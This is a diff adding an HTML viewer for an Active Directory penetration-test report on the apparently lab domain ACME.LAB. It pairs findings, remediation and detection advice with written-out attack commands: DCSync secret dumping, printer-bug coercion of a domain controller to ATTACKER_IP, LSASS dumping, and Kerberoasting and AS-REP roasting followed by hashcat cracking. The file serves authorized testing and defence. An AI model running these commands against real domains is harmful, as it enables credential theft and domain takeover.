@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HorusEye Explorer — ACME.LAB</title>
+<style>
+ :root{--bg:#0d0d0d;--panel:#151515;--panel2:#1b1b1b;--line:#2a2a2a;--fg:#e6e6e6;
+   --muted:#9a9a9a;--gold:#C09A3C;--red:#E4002B;--code:#00ff9c;
+   --crit:#ff4444;--high:#ff8800;--med:#ffcc00;--low:#88cc00;--info:#888}
+ *{box-sizing:border-box}
+ body{margin:0;background:var(--bg);color:var(--fg);
+   font-family:-apple-system,Segoe UI,Roboto,sans-serif;font-size:14px}
+ header{padding:14px 20px;border-bottom:1px solid var(--line);display:flex;
+   align-items:center;gap:18px;flex-wrap:wrap;background:var(--panel)}
+ header h1{margin:0;color:var(--red);font-size:18px}
+ header .meta{color:var(--muted);font-size:13px}
+ .tiles{display:flex;gap:8px;margin-left:auto;flex-wrap:wrap}
+ .tile{background:var(--panel2);border:1px solid var(--line);border-radius:8px;
+   padding:6px 12px;text-align:center;min-width:64px}
+ .tile b{display:block;font-size:20px} .tile span{font-size:11px;color:var(--muted);letter-spacing:.06em}
+ nav{display:flex;gap:4px;padding:10px 20px 0;border-bottom:1px solid var(--line);background:var(--panel)}
+ nav button{background:none;border:none;color:var(--muted);padding:8px 16px;cursor:pointer;
+   font-size:14px;border-bottom:2px solid transparent}
+ nav button.active{color:var(--fg);border-bottom-color:var(--red)}
+ main{padding:18px 20px}
+ .view{display:none} .view.active{display:block}
+ h2{color:var(--gold);border-bottom:1px solid var(--line);padding-bottom:6px;font-size:15px;margin-top:4px}
+ .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+ @media(max-width:800px){.grid{grid-template-columns:1fr}}
+ .card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+ table{width:100%;border-collapse:collapse;font-size:13px}
+ th{color:var(--gold);text-align:left;padding:6px 8px;border-bottom:1px solid var(--line);cursor:pointer}
+ td{padding:6px 8px;border-bottom:1px solid #202020;vertical-align:top}
+ .pill{color:#111;font-weight:700;padding:1px 7px;border-radius:9px;font-size:11px;white-space:nowrap}
+ .sev-CRITICAL{background:var(--crit)} .sev-HIGH{background:var(--high)}
+ .sev-MEDIUM{background:var(--med)} .sev-LOW{background:var(--low)} .sev-INFO{background:var(--info)}
+ code,pre{background:#000;color:var(--code);font-family:ui-monospace,Consolas,monospace;border-radius:5px}
+ code{padding:1px 5px;font-size:12px} pre{padding:8px 10px;overflow-x:auto;border:1px solid var(--line);font-size:12px}
+ .controls{display:flex;gap:8px;align-items:center;margin:10px 0;flex-wrap:wrap}
+ .controls input,.controls select{background:var(--panel2);border:1px solid var(--line);
+   color:var(--fg);padding:6px 10px;border-radius:7px}
+ .fbtn{background:var(--panel2);border:1px solid var(--line);color:var(--muted);
+   padding:4px 10px;border-radius:14px;cursor:pointer;font-size:12px}
+ .fbtn.active{color:#fff;border-color:var(--red)}
+ .frow{cursor:pointer} .frow:hover{background:#181818}
+ .detail{background:var(--panel2);border-left:2px solid var(--red)}
+ .lab{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.07em;margin:10px 0 3px}
+ ul{margin:3px 0 3px 16px;padding:0} li{margin:2px 0}
+ .graphwrap{display:flex;gap:14px;flex-wrap:wrap}
+ .graphsvg{flex:1 1 560px;min-width:320px;background:var(--panel);border:1px solid var(--line);border-radius:10px;overflow:auto}
+ .side{flex:1 1 300px;min-width:260px}
+ .node rect{cursor:pointer} .node text{font-size:11px;fill:var(--fg);pointer-events:none}
+ .edge{cursor:pointer} .legend span{display:inline-block;margin-right:12px;color:var(--muted);font-size:12px}
+ .muted{color:var(--muted)} .tag{font-size:11px;color:var(--muted)}
+ a{color:#5ab0ff}
+ footer{color:var(--muted);font-size:11px;padding:16px 20px;border-top:1px solid var(--line)}
+</style></head><body>
+<header>
+ <h1>𓂀 HorusEye Explorer</h1>
+ <div class="meta" id="hmeta"></div>
+ <div class="tiles" id="tiles"></div>
+</header>
+<nav>
+ <button data-view="overview" class="active">Overview</button>
+ <button data-view="paths">Attack Paths</button>
+ <button data-view="findings">Findings</button>
+</nav>
+<main>
+ <section id="overview" class="view active"></section>
+ <section id="paths" class="view"></section>
+ <section id="findings" class="view"></section>
+</main>
+<footer>Generated offline by HorusEye — authorized security testing only. No data leaves this file. 𓂀</footer>
+<script id="data" type="application/json">{"meta": {"domain": "ACME.LAB", "dc": "10.10.0.5", "generated": "2025-10-09 08:53:20", "total": 7, "counts": {"CRITICAL": 2, "HIGH": 4, "LOW": 1}, "warnings": [], "sources": ["bloodhound"], "parse_counts": {"users": 6, "groups": 2, "computers": 3, "acls": 2, "sessions": 1, "gpos": 0, "trusts": 1, "spns": 1, "asrep_users": 1, "local_admins": 1, "delegation_targets": 0}}, "mitre": [{"id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory", "count": 1, "max_severity": "HIGH"}, {"id": "T1003.006", "name": "OS Credential Dumping: DCSync", "count": 1, "max_severity": "CRITICAL"}, {"id": "T1078.002", "name": "Valid Accounts: Domain Accounts", "count": 2, "max_severity": "HIGH"}, {"id": "T1134.005", "name": "Access Token Manipulation: SID-History Injection", "count": 1, "max_severity": "HIGH"}, {"id": "T1187", "name": "Forced Authentication", "count": 1, "max_severity": "CRITICAL"}, {"id": "T1482", "name": "Domain Trust Discovery", "count": 1, "max_severity": "HIGH"}, {"id": "T1558", "name": "Steal or Forge Kerberos Tickets", "count": 1, "max_severity": "CRITICAL"}, {"id": "T1558.003", "name": "Steal or Forge Kerberos Tickets: Kerberoasting", "count": 1, "max_severity": "HIGH"}, {"id": "T1558.004", "name": "Steal or Forge Kerberos Tickets: AS-REP Roasting", "count": 1, "max_severity": "HIGH"}], "findings": [{"type": "DCSYNC", "title": "DCSync rights: HELPDESK-SVC@ACME.LAB", "affected": "HELPDESK-SVC@ACME.LAB", "severity": "CRITICAL", "description": "Principal holds directory-replication rights (getchanges, getchangesall) on the domain. It can replicate secrets from the DC — including the krbtgt hash — without running code on a Domain Controller.", "evidence": [{"source": "acl", "object": "HELPDESK-SVC@ACME.LAB → ACME.LAB", "detail": "getchanges", "file": "domains.json"}, {"source": "acl", "object": "HELPDESK-SVC@ACME.LAB → ACME.LAB", "detail": "getchangesall", "file": "domains.json"}], "commands": ["impacket-secretsdump ACME.LAB/HELPDESK-SVC@10.10.0.5 -just-dc", "impacket-secretsdump ACME.LAB/HELPDESK-SVC@10.10.0.5 -just-dc-user ACME\\\\krbtgt"], "references": ["https://attack.mitre.org/techniques/T1003/006/"], "id": "a8e31192f8dc", "confidence": "HIGH", "confidence_reason": "replication ACEs present on the domain object", "rule_id": "DCSYNC", "ease": 1.0, "score": 100, "mitre": [{"id": "T1003.006", "name": "OS Credential Dumping: DCSync"}], "remediation": ["Remove replication rights (Get-Changes / Get-Changes-All / Get-Changes-In-Filtered-Set) from every principal that is not a Domain Controller or a deliberately Tier-0 group.", "Review the domain root ACL and AdminSDHolder for unexpected grants.", "If abuse is suspected, reset the krbtgt password twice (with replication time between resets)."], "detection": ["Event 4662 on the domain object with an access GUID of 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes), 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All), 89e95b76-444d-4c62-991a-0facbeda640c (DS-Replication-Get-Changes-In-Filtered-Set) from a non-DC account.", "DRSUAPI (DRSGetNCChanges) replication traffic originating from a host that is not a Domain Controller."]}, {"type": "UNCONSTRAINED_DELEGATION", "title": "Unconstrained delegation: WEB01.ACME.LAB", "affected": "WEB01.ACME.LAB", "severity": "CRITICAL", "description": "Computer 'WEB01.ACME.LAB' is trusted for unconstrained delegation. Coerce a DC to authenticate to it (PrinterBug / PetitPotam) and capture a reusable TGT — including a DC's. Verify this host is not itself a Domain Controller (where the flag is expected).", "evidence": [{"source": "bloodhound", "object": "WEB01.ACME.LAB", "detail": "TRUSTED_FOR_DELEGATION=true"}], "commands": ["# capture tickets on WEB01.ACME.LAB, then coerce a DC:", "python3 printerbug.py DOMAIN/USER:PASS@DC_IP ATTACKER_IP", "impacket-rubeus monitor  # or Rubeus.exe monitor on the host"], "references": ["https://attack.mitre.org/techniques/T1558/"], "id": "d6d28e132520", "confidence": "HIGH", "confidence_reason": "TRUSTED_FOR_DELEGATION flag read directly", "rule_id": "UNCONSTRAINED_DELEGATION", "ease": 0.85, "score": 85, "mitre": [{"id": "T1558", "name": "Steal or Forge Kerberos Tickets"}, {"id": "T1187", "name": "Forced Authentication"}], "remediation": ["Replace unconstrained delegation with constrained delegation or resource-based constrained delegation (RBCD).", "Mark privileged accounts 'Account is sensitive and cannot be delegated' and add them to Protected Users.", "Disable the Print Spooler service on Domain Controllers and mitigate coercion vectors (e.g. EFSRPC/PetitPotam RPC filters)."], "detection": ["Event 4624 network logons from Domain Controller machine accounts to non-DC hosts.", "Spooler (MS-RPRN) or EFSRPC calls targeting Domain Controllers from member hosts."]}, {"type": "PRIVILEGED_SESSION", "title": "Privileged session: ADMINISTRATOR@ACME.LAB on WEB01.ACME.LAB", "affected": "ADMINISTRATOR@ACME.LAB@WEB01.ACME.LAB", "severity": "HIGH", "description": "Tier-0 principal ADMINISTRATOR@ACME.LAB has a session on WEB01.ACME.LAB. Local admin on WEB01.ACME.LAB means that credential can be dumped from memory and reused. Non-Tier-0 principals with local admin there: HELPDESK@ACME.LAB.", "evidence": [{"source": "bloodhound", "object": "ADMINISTRATOR@ACME.LAB@WEB01.ACME.LAB", "detail": "HasSession"}, {"source": "bloodhound", "object": "HELPDESK@ACME.LAB → WEB01.ACME.LAB", "detail": "AdminTo"}], "commands": ["# with local admin on WEB01.ACME.LAB, dump LSASS and extract ADMINISTRATOR@ACME.LAB's secret", "nxc smb WEB01.ACME.LAB -u USER -p PASS --lsa"], "references": ["https://attack.mitre.org/techniques/T1003/001/"], "id": "dbb022541572", "confidence": "MEDIUM", "confidence_reason": "session data is point-in-time and may be stale", "rule_id": "PRIVILEGED_SESSION", "ease": 0.8, "score": 60, "mitre": [{"id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory"}, {"id": "T1078.002", "name": "Valid Accounts: Domain Accounts"}], "remediation": ["Enforce a tiered admin model: Tier-0 accounts only log on to Tier-0 systems (use Privileged Access Workstations).", "Add administrators to Protected Users and enable LSA protection (RunAsPPL) and Credential Guard.", "Log off stale admin sessions on member servers and workstations."], "detection": ["Event 4624 logons by Tier-0 accounts on non-Tier-0 hosts.", "Process access to lsass.exe (Sysmon Event 10) on hosts where admins are logged on."]}, {"type": "ASREP_ROASTING", "title": "AS-REP roastable: SVC-BACKUP@ACME.LAB", "affected": "SVC-BACKUP@ACME.LAB", "severity": "HIGH", "description": "Account has DONT_REQUIRE_PREAUTH set, so its AS-REP can be requested without credentials and cracked offline.", "evidence": [{"source": "bloodhound", "object": "SVC-BACKUP@ACME.LAB", "detail": "DONT_REQ_PREAUTH=true"}], "commands": ["impacket-GetNPUsers ACME.LAB/SVC-BACKUP@ACME.LAB -no-pass -dc-ip 10.10.0.5 -format hashcat -outputfile asrep.hash", "hashcat -m 18200 asrep.hash wordlist.txt -r rules/best64.rule"], "references": ["https://attack.mitre.org/techniques/T1558/004/"], "id": "10761754f61d", "confidence": "HIGH", "confidence_reason": "DONT_REQ_PREAUTH flag read directly", "rule_id": "ASREP_ROASTING", "ease": 0.75, "score": 56, "mitre": [{"id": "T1558.004", "name": "Steal or Forge Kerberos Tickets: AS-REP Roasting"}], "remediation": ["Enable Kerberos pre-authentication: clear 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) on the account.", "If the flag is required for a legacy app, enforce a long random password and restrict the account's privileges."], "detection": ["Event 4768 (TGT requested) with Pre-Authentication Type 0.", "AS-REQ for preauth-disabled accounts from hosts that do not normally use them."]}, {"type": "KERBEROASTING", "title": "Kerberoastable account: SVC-SQL@ACME.LAB", "affected": "SVC-SQL@ACME.LAB", "severity": "HIGH", "description": "Service account exposes an SPN, so any authenticated user can request a TGS and crack it offline. Prioritise if the cleartext grants onward access. SPNs: MSSQLSvc/sql01.acme.lab:1433", "evidence": [{"source": "bloodhound", "object": "SVC-SQL@ACME.LAB", "detail": "hasSPN=true"}, {"source": "bloodhound", "object": "SVC-SQL@ACME.LAB", "detail": "SPN: MSSQLSvc/sql01.acme.lab:1433"}], "commands": ["impacket-GetUserSPNs ACME.LAB/USER:PASS -dc-ip 10.10.0.5 -request -outputfile kerb.hash", "hashcat -m 13100 kerb.hash wordlist.txt -r rules/best64.rule"], "references": ["https://attack.mitre.org/techniques/T1558/003/"], "id": "b7443e937d5b", "confidence": "HIGH", "confidence_reason": "hasSPN read directly from the directory", "rule_id": "KERBEROASTING", "ease": 0.7, "score": 52, "mitre": [{"id": "T1558.003", "name": "Steal or Forge Kerberos Tickets: Kerberoasting"}], "remediation": ["Move services to group Managed Service Accounts (gMSA) so passwords are 120+ random characters and rotate automatically.", "Give any remaining service accounts a random password of 25+ characters.", "Enforce AES-only Kerberos encryption (msDS-SupportedEncryptionTypes) and disable RC4 so tickets are far harder to crack.", "Remove service accounts from privileged groups; never put an SPN on a Tier-0 account."], "detection": ["Event 4769 (Kerberos service ticket requested) with Ticket Encryption Type 0x17 (RC4) for a service account.", "A single account requesting TGS tickets for many SPNs in a short window.", "Deploy a honeypot account with an SPN and alert on any 4769 for it."]}, {"type": "DOMAIN_TRUST", "title": "Domain trust: ACME.LAB ↔ PARTNER.LAB", "affected": "PARTNER.LAB", "severity": "HIGH", "description": "Trust to 'PARTNER.LAB' (direction=Bidirectional, type=Forest, transitive=True). Bidirectional forest trust — SID history / cross-forest Kerberoasting may extend compromise across the boundary.", "evidence": [{"source": "bloodhound", "object": "PARTNER.LAB", "detail": "direction=Bidirectional, type=Forest, transitive=True"}], "commands": ["impacket-GetUserSPNs -target-domain PARTNER.LAB ACME.LAB/USER:PASS -dc-ip 10.10.0.5 -request"], "references": ["https://attack.mitre.org/techniques/T1482/"], "id": "1ec85d35d4a9", "confidence": "MEDIUM", "confidence_reason": "trust exists; exploitability depends on its config", "rule_id": "DOMAIN_TRUST", "ease": 0.6, "score": 45, "mitre": [{"id": "T1482", "name": "Domain Trust Discovery"}, {"id": "T1134.005", "name": "Access Token Manipulation: SID-History Injection"}], "remediation": ["Enable SID filtering (quarantine) on external and forest trusts.", "Use Selective Authentication on forest trusts.", "Remove trusts that are no longer required and review trust direction."], "detection": ["Event 4675 (SIDs were filtered) and cross-realm 4769 requests from unusual principals."]}, {"type": "STALE_ADMIN", "title": "Stale privileged account: OLD-ADMIN@ACME.LAB", "affected": "OLD-ADMIN@ACME.LAB", "severity": "LOW", "description": "Privileged account 'OLD-ADMIN@ACME.LAB': disabled but still admin-flagged (adminCount=1). Lingering Tier-0 accounts widen the attack surface and are prime spraying / re-enable targets.", "evidence": [{"source": "bloodhound", "object": "OLD-ADMIN@ACME.LAB", "detail": "adminCount=1"}, {"source": "bloodhound", "object": "OLD-ADMIN@ACME.LAB", "detail": "enabled=false"}], "commands": ["# review necessity; if unused, disable and strip group membership"], "references": ["https://attack.mitre.org/techniques/T1078/002/"], "id": "252c3d665840", "confidence": "MEDIUM", "confidence_reason": "heuristic on adminCount + account state", "rule_id": "STALE_ADMIN", "ease": 0.4, "score": 10, "mitre": [{"id": "T1078.002", "name": "Valid Accounts: Domain Accounts"}], "remediation": ["Disable or delete privileged accounts that are no longer used.", "After removing an account from protected groups, clear adminCount and restore ACL inheritance.", "Remove 'password never expires' from administrative accounts and run periodic access reviews."], "detection": ["Event 4722 (account enabled) for a dormant privileged account.", "Logons by privileged accounts that have been inactive for a long period."]}], "paths": [{"hops": 3, "start": "JDOE@ACME.LAB", "goal": "ADMINISTRATOR@ACME.LAB", "inferred_steps": 0, "rationale": "3 hop(s), all steps are observed relationships. Shorter, fully-observed paths rank higher.", "steps": [{"from": "JDOE@ACME.LAB", "to": "HELPDESK@ACME.LAB", "type": "MemberOf", "detail": "member of group", "trust": "observed"}, {"from": "HELPDESK@ACME.LAB", "to": "WEB01.ACME.LAB", "type": "AdminTo", "detail": "local administrator", "trust": "observed"}, {"from": "WEB01.ACME.LAB", "to": "ADMINISTRATOR@ACME.LAB", "type": "HasSession", "detail": "credentials in memory", "trust": "observed"}], "commands": ["# already inherit HELPDESK@ACME.LAB's rights via group membership", "nxc smb WEB01.ACME.LAB -u USER -p PASS --sam  # local admin on WEB01.ACME.LAB", "# dump LSASS on WEB01.ACME.LAB to recover ADMINISTRATOR@ACME.LAB's credentials\nnxc smb WEB01.ACME.LAB -u USER -p PASS --lsa"]}], "graph": {"nodes": [{"id": "JDOE@ACME.LAB", "label": "JDOE@ACME.LAB", "depth": 0, "kind": "start"}, {"id": "HELPDESK@ACME.LAB", "label": "HELPDESK@ACME.LAB", "depth": 1, "kind": "mid"}, {"id": "WEB01.ACME.LAB", "label": "WEB01.ACME.LAB", "depth": 2, "kind": "mid"}, {"id": "ADMINISTRATOR@ACME.LAB", "label": "ADMINISTRATOR@ACME.LAB", "depth": 3, "kind": "goal"}], "edges": [{"from": "JDOE@ACME.LAB", "to": "HELPDESK@ACME.LAB", "type": "MemberOf", "trust": "observed", "detail": "member of group", "command": "# already inherit HELPDESK@ACME.LAB's rights via group membership", "choke": true}, {"from": "HELPDESK@ACME.LAB", "to": "WEB01.ACME.LAB", "type": "AdminTo", "trust": "observed", "detail": "local administrator", "command": "nxc smb WEB01.ACME.LAB -u USER -p PASS --sam  # local admin on WEB01.ACME.LAB", "choke": true}, {"from": "WEB01.ACME.LAB", "to": "ADMINISTRATOR@ACME.LAB", "type": "HasSession", "trust": "observed", "detail": "credentials in memory", "command": "# dump LSASS on WEB01.ACME.LAB to recover ADMINISTRATOR@ACME.LAB's credentials", "choke": false}]}}</script>
+<script>
+"use strict";
+var DATA = JSON.parse(document.getElementById("data").textContent);
+var SEV = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"];
+var SEVC = {CRITICAL:"var(--crit)",HIGH:"var(--high)",MEDIUM:"var(--med)",LOW:"var(--low)",INFO:"var(--info)"};
+function esc(s){s=(s==null?"":""+s);return s.replace(/[&<>"]/g,function(c){
+  return {"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;"}[c];});}
+function el(id){return document.getElementById(id);}
+
+// ── Header ──
+(function(){
+ var m=DATA.meta;
+ el("hmeta").innerHTML="Domain <b>"+esc(m.domain)+"</b> &middot; DC "+esc(m.dc)
+   +" &middot; "+esc(m.generated)+" &middot; "+m.total+" findings";
+ var t=el("tiles"),h="";
+ SEV.forEach(function(s){var n=m.counts[s]||0;if(!n)return;
+   h+='<div class="tile"><b style="color:'+SEVC[s]+'">'+n+'</b><span>'+s+'</span></div>';});
+ t.innerHTML=h;
+})();
+
+// ── Tabs ──
+Array.prototype.forEach.call(document.querySelectorAll("nav button"),function(b){
+ b.onclick=function(){
+   Array.prototype.forEach.call(document.querySelectorAll("nav button"),function(x){x.classList.remove("active");});
+   Array.prototype.forEach.call(document.querySelectorAll(".view"),function(x){x.classList.remove("active");});
+   b.classList.add("active"); el(b.dataset.view).classList.add("active");
+ };
+});
+
+// ── Overview ──
+(function(){
+ var m=DATA.meta,h="";
+ h+='<div class="grid">';
+ // risk summary
+ h+='<div class="card"><h2>Risk summary</h2><table>';
+ SEV.forEach(function(s){var n=m.counts[s]||0;
+   h+='<tr><td><span class="pill sev-'+s+'">'+s+'</span></td><td>'+n+'</td></tr>';});
+ h+='</table>';
+ if(m.warnings&&m.warnings.length){h+='<div class="lab">Import warnings</div><ul>';
+   m.warnings.forEach(function(w){h+='<li class="muted">⚠️ '+esc(w)+'</li>';});h+='</ul>';}
+ h+='<div class="lab">Sources</div><div class="muted">'+esc((m.sources||[]).join(", ")||"—")+'</div>';
+ h+='</div>';
+ // top exposures
+ h+='<div class="card"><h2>Top exposures</h2><table>';
+ var top=DATA.findings.slice().sort(bySeverity).slice(0,8);
+ top.forEach(function(f){h+='<tr><td><span class="pill sev-'+(f.severity||"INFO")+'">'
+   +(f.severity||"INFO")+'</span></td><td>'+esc(f.title)+'</td></tr>';});
+ h+='</table></div>';
+ // mitre
+ h+='<div class="card"><h2>MITRE ATT&amp;CK coverage</h2><table><tr><th>Technique</th><th>Name</th><th>Max</th><th>#</th></tr>';
+ (DATA.mitre||[]).forEach(function(mt){
+   h+='<tr><td><a href="https://attack.mitre.org/techniques/'+mt.id.replace(".","/")+'/" target="_blank">'+mt.id+'</a></td>'
+     +'<td>'+esc(mt.name)+'</td><td><span class="pill sev-'+mt.max_severity+'">'+mt.max_severity+'</span></td><td>'+mt.count+'</td></tr>';});
+ h+='</table></div>';
+ // paths summary
+ h+='<div class="card"><h2>Attack paths</h2>';
+ if(DATA.paths.length){h+='<p>'+DATA.paths.length+' route(s) to the target. Shortest: <b>'
+   +DATA.paths[0].hops+' hop(s)</b>. See the <a href="#" onclick="gotoPaths();return false">Attack Paths</a> view.</p>';}
+ else{h+='<p class="muted">No path to the target from the chosen foothold. Add --owned or collect session/local-admin data.</p>';}
+ h+='</div></div>';
+ el("overview").innerHTML=h;
+})();
+function gotoPaths(){document.querySelector('nav button[data-view="paths"]').click();}
+function bySeverity(a,b){return SEV.indexOf(a.severity||"INFO")-SEV.indexOf(b.severity||"INFO");}
+
+// ── Attack Paths (SVG) ──
+(function(){
+ var g=DATA.graph, h="";
+ if(!g.nodes.length){el("paths").innerHTML='<div class="card"><h2>Attack Paths</h2>'
+   +'<p class="muted">No attack paths computed for this run.</p></div>';return;}
+ // layout: columns by depth
+ var byDepth={}, maxDepth=0;
+ g.nodes.forEach(function(n){(byDepth[n.depth]=byDepth[n.depth]||[]).push(n);maxDepth=Math.max(maxDepth,n.depth);});
+ var colW=210, rowH=58, padX=20, padY=30, boxW=170, boxH=34;
+ var pos={};
+ Object.keys(byDepth).forEach(function(d){
+   byDepth[d].forEach(function(n,i){pos[n.id]={x:padX+d*colW,y:padY+i*rowH,w:boxW,h:boxH};});});
+ var height=padY*2+Math.max.apply(null,Object.keys(byDepth).map(function(d){return byDepth[d].length;}))*rowH;
+ var width=padX*2+(maxDepth+1)*colW;
+ var svg='<svg class="graphsvg" viewBox="0 0 '+width+' '+Math.max(height,160)
+   +'" style="min-height:220px" xmlns="http://www.w3.org/2000/svg">';
+ svg+='<defs><marker id="arr" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">'
+   +'<path d="M0,0 L7,3 L0,6 Z" fill="#888"/></marker>'
+   +'<marker id="arrc" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">'
+   +'<path d="M0,0 L7,3 L0,6 Z" fill="var(--red)"/></marker></defs>';
+ // edges
+ g.edges.forEach(function(e,i){var a=pos[e.from],b=pos[e.to];if(!a||!b)return;
+   var x1=a.x+a.w,y1=a.y+a.h/2,x2=b.x,y2=b.y+b.h/2;
+   var col=e.choke?"var(--red)":"#888";
+   svg+='<line class="edge" data-edge="'+i+'" x1="'+x1+'" y1="'+y1+'" x2="'+x2+'" y2="'+y2
+     +'" stroke="'+col+'" stroke-width="'+(e.choke?2.2:1.4)+'" '
+     +(e.trust==="inferred"?'stroke-dasharray="5,4" ':'')
+     +'marker-end="url(#'+(e.choke?'arrc':'arr')+')"/>';
+   svg+='<text x="'+((x1+x2)/2)+'" y="'+((y1+y2)/2-4)+'" text-anchor="middle" '
+     +'fill="#aaa" font-size="10" pointer-events="none">'+esc(e.type)+'</text>';});
+ // nodes
+ g.nodes.forEach(function(n){var p=pos[n.id];
+   var fill=n.kind==="goal"?"#3a1414":(n.kind==="start"?"#14321c":"var(--panel2)");
+   var stroke=n.kind==="goal"?"var(--red)":(n.kind==="start"?"#3fae6a":"var(--line)");
+   var lbl=n.label.split("@")[0]; if(lbl.length>22)lbl=lbl.slice(0,21)+"…";
+   svg+='<g class="node" data-node="'+esc(n.id)+'">'
+     +'<rect x="'+p.x+'" y="'+p.y+'" width="'+p.w+'" height="'+p.h+'" rx="7" fill="'+fill+'" stroke="'+stroke+'"/>'
+     +'<text x="'+(p.x+8)+'" y="'+(p.y+p.h/2+4)+'">'+esc(lbl)+'</text></g>';});
+ svg+='</svg>';
+
+ h+='<h2>Attack Paths to target</h2>';
+ h+='<div class="legend" style="margin-bottom:8px">'
+   +'<span><b style="color:#3fae6a">▬</b> foothold</span>'
+   +'<span><b style="color:var(--red)">▬</b> target</span>'
+   +'<span style="color:var(--red)">━ choke point (breaks path)</span>'
+   +'<span>╌ inferred step</span></div>';
+ h+='<div class="graphwrap">'+svg+'<div class="side card" id="pdetail">'
+   +'<div class="muted">Click a node or edge to inspect it.</div>';
+ // choke summary
+ var chokes=g.edges.filter(function(e){return e.choke;});
+ if(chokes.length){h+='<div class="lab">Remediation — break the path</div><ul>';
+   chokes.forEach(function(e){h+='<li>✂ remove <b>'+esc(e.type)+'</b> '+esc(short(e.from))+' → '+esc(short(e.to))+'</li>';});
+   h+='</ul>';}
+ h+='</div></div>';
+ el("paths").innerHTML=h;
+
+ // interactions
+ Array.prototype.forEach.call(document.querySelectorAll("#paths .edge"),function(ln){
+   ln.onclick=function(){var e=g.edges[+ln.dataset.edge];
+     el("pdetail").innerHTML='<div class="lab">Edge</div><b>'+esc(e.type)+'</b> '
+       +(e.trust==="inferred"?'<span class="tag">(inferred)</span>':'<span class="tag">(observed)</span>')
+       +'<div class="muted" style="margin:4px 0">'+esc(short(e.from))+' → '+esc(short(e.to))+'</div>'
+       +'<div>'+esc(e.detail)+'</div>'
+       +(e.command?'<div class="lab">Command</div><pre>'+esc(e.command)+'</pre>':'')
+       +(e.choke?'<div class="lab">Remediation impact</div><div>Choke point — removing this breaks the path with no alternative.</div>':'');};});
+ Array.prototype.forEach.call(document.querySelectorAll("#paths .node"),function(nd){
+   nd.onclick=function(){var id=nd.dataset.node;
+     var rel=DATA.findings.filter(function(f){return (f.affected||"").indexOf(id)>=0
+       || (f.evidence||[]).some(function(ev){return (ev.object||"").indexOf(id)>=0;});});
+     var h='<div class="lab">Node</div><b>'+esc(id)+'</b>';
+     if(rel.length){h+='<div class="lab">Findings here ('+rel.length+')</div>';
+       rel.forEach(function(f){h+='<div><span class="pill sev-'+(f.severity||"INFO")+'">'
+         +(f.severity||"INFO")+'</span> '+esc(f.title)+'</div>';});}
+     else{h+='<div class="muted" style="margin-top:6px">No findings directly on this node.</div>';}
+     el("pdetail").innerHTML=h;};});
+})();
+function short(s){s=s||"";return s.split("@")[0];}
+
+// ── Findings ──
+(function(){
+ var state={sev:"ALL",q:""};
+ var h='<h2>Findings</h2><div class="controls">';
+ h+='<span class="fbtn active" data-sev="ALL">All</span>';
+ SEV.forEach(function(s){if(DATA.meta.counts[s])h+='<span class="fbtn" data-sev="'+s+'">'+s+'</span>';});
+ h+='<input id="fq" placeholder="search title / affected / rule…" style="flex:1;min-width:160px">';
+ h+='</div><table id="ftab"><thead><tr><th data-k="severity">Severity</th><th data-k="score">Score</th>'
+   +'<th data-k="confidence">Conf.</th><th data-k="rule_id">Rule</th><th data-k="affected">Affected</th><th>Title</th></tr></thead><tbody></tbody></table>';
+ el("findings").innerHTML=h;
+ var tbody=document.querySelector("#ftab tbody");
+ var sortK="severity",sortDir=1;
+
+ function render(){
+   var rows=DATA.findings.filter(function(f){
+     if(state.sev!=="ALL"&&(f.severity||"INFO")!==state.sev)return false;
+     if(state.q){var s=(f.title+" "+f.affected+" "+(f.rule_id||f.type)).toLowerCase();
+       if(s.indexOf(state.q.toLowerCase())<0)return false;}
+     return true;});
+   rows.sort(function(a,b){
+     if(sortK==="severity")return (SEV.indexOf(a.severity||"INFO")-SEV.indexOf(b.severity||"INFO"))*sortDir;
+     if(sortK==="score")return ((b.score||0)-(a.score||0))*sortDir;
+     var av=(""+(a[sortK]||"")),bv=(""+(b[sortK]||""));return av.localeCompare(bv)*sortDir;});
+   var out="";
+   rows.forEach(function(f,i){
+     out+='<tr class="frow" data-i="'+i+'"><td><span class="pill sev-'+(f.severity||"INFO")+'">'
+       +(f.severity||"INFO")+'</span></td><td>'+(f.score==null?"":f.score)+'</td>'
+       +'<td class="tag">'+esc(f.confidence||"")+'</td><td><code>'+esc(f.rule_id||f.type)+'</code></td>'
+       +'<td class="muted">'+esc(f.affected)+'</td><td>'+esc(f.title)+'</td></tr>'
+       +'<tr class="detail" id="d'+i+'" style="display:none"><td colspan="6">'+detail(f)+'</td></tr>';});
+   tbody.innerHTML=out||'<tr><td colspan="6" class="muted">No findings match.</td></tr>';
+   Array.prototype.forEach.call(document.querySelectorAll("#ftab .frow"),function(r){
+     r.onclick=function(){var d=el("d"+r.dataset.i);d.style.display=d.style.display==="none"?"table-row":"none";};});
+   window._frows=rows;
+ }
+ function detail(f){
+   var h="";
+   if(f.description)h+='<p>'+esc(f.description)+'</p>';
+   if(f.confidence)h+='<div class="tag">confidence '+esc(f.confidence)+' — '+esc(f.confidence_reason||"")+'</div>';
+   if(f.evidence&&f.evidence.length){h+='<div class="lab">Evidence ('+f.evidence.length+')</div><ul>';
+     f.evidence.slice(0,60).forEach(function(e){h+='<li><code>'+esc(e.object)+'</code>'
+       +(e.detail?' — '+esc(e.detail):'')+' <span class="tag">('+esc(e.source)+(e.file?", "+esc(e.file):"")+')</span></li>';});
+     if(f.evidence.length>60)h+='<li class="tag">+'+(f.evidence.length-60)+' more</li>';h+='</ul>';}
+   if(f.commands&&f.commands.length){h+='<div class="lab">Validate</div>';
+     f.commands.forEach(function(c){h+='<pre>'+esc(c)+'</pre>';});}
+   if(f.remediation&&f.remediation.length){h+='<div class="lab">Remediation</div><ul>';
+     f.remediation.forEach(function(r){h+='<li>'+esc(r)+'</li>';});h+='</ul>';}
